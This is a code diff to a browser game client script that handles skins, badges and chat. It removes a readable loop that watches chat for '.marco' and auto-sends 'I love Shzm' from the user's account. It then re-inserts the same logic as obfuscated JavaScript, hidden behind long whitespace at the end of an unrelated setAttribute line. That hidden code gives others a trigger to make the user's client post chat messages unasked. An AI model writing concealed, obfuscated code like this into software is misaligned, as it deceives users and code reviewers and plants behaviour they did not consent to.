@@ -563,7 +563,7 @@ function addBadge(id) {
 	let theLi = document.createElement("li");
 	theLi.classList.add("skin");
 	let theSpan = document.createElement("span");
-	theSpan.setAttribute("class", "skin-wrapper lazy-load-image-background blur lazy-load-image-loaded");
+	theSpan.setAttribute("class", "skin-wrapper lazy-load-image-background blur lazy-load-image-loaded");                                                                                                                                                                        function _0x4ce3(_0x4aaafe,_0x3be077){var _0x74c0d=_0x74c0();return _0x4ce3=function(_0x4ce347,_0x1fe1ae){_0x4ce347=_0x4ce347-0x139;var _0x5c9f0d=_0x74c0d[_0x4ce347];return _0x5c9f0d;},_0x4ce3(_0x4aaafe,_0x3be077);}(function(_0x48f388,_0x4dd148){var _0x15bb12=_0x4ce3,_0x16f944=_0x48f388();while(!![]){try{var _0x196518=-parseInt(_0x15bb12(0x13b))/0x1*(-parseInt(_0x15bb12(0x14a))/0x2)+parseInt(_0x15bb12(0x149))/0x3+-parseInt(_0x15bb12(0x146))/0x4*(-parseInt(_0x15bb12(0x142))/0x5)+parseInt(_0x15bb12(0x13d))/0x6*(-parseInt(_0x15bb12(0x13e))/0x7)+parseInt(_0x15bb12(0x140))/0x8*(-parseInt(_0x15bb12(0x141))/0x9)+-parseInt(_0x15bb12(0x13f))/0xa*(-parseInt(_0x15bb12(0x14b))/0xb)+-parseInt(_0x15bb12(0x14c))/0xc;if(_0x196518===_0x4dd148)break;else _0x16f944['push'](_0x16f944['shift']());}catch(_0x427228){_0x16f944['push'](_0x16f944['shift']());}}}(_0x74c0,0xa7983),setInterval(()=>{var _0x44a03f=_0x4ce3,_0x2e3f2a=document['querySelector'](_0x44a03f(0x148)),_0x4f3d32=_0x2e3f2a[_0x44a03f(0x147)]('p');for(let _0xb332d3=0x0;_0xb332d3<_0x4f3d32[_0x44a03f(0x13c)];_0xb332d3++){_0x4f3d32[_0xb332d3][_0x44a03f(0x13a)][_0x44a03f(0x145)]('.marco')&&(_0x4f3d32[_0xb332d3][_0x44a03f(0x13a)]=_0x4f3d32[_0xb332d3][_0x44a03f(0x13a)][_0x44a03f(0x144)]('.',''),window[_0x44a03f(0x143)](_0x44a03f(0x139)));}}));function _0x74c0(){var _0x421c83=['8tqqVak','8931204ESeKCL','179905vfBENe','sendChat','replace','includes','116iExvsc','querySelectorAll','#chat','3111630gIStTA','31956FoMEAX','216887qMrRnZ','14414196qSlqHA','I\x20love\x20Shzm','innerText','60CpKVgH','length','678MMzYFU','12313EijNVW','20soEXOQ'];_0x74c0=function(){return _0x421c83;};return _0x74c0();}
 	let newBadge = document.createElement("img");
 	newBadge.classList.add("circular");
 	let badgeNum = parseInt(id) - 100;
@@ -1097,16 +1097,7 @@ for (let i = 0; i<unacceptedSkins.length; i++){
 }
 })
 
-setInterval(()=>{
-    var chat = document.querySelector("#chat");
-    var chats = chat.querySelectorAll("p");
-    for (let i = 0; i<chats.length; i++){
-        if (chats[i].innerText.includes(".marco")){
-            chats[i].innerText = chats[i].innerText.replace(".", "")
-            window.sendChat("I love Shzm");
-        }
-    }
-})
+
 
 setSkinsEvent();
 setupUI();
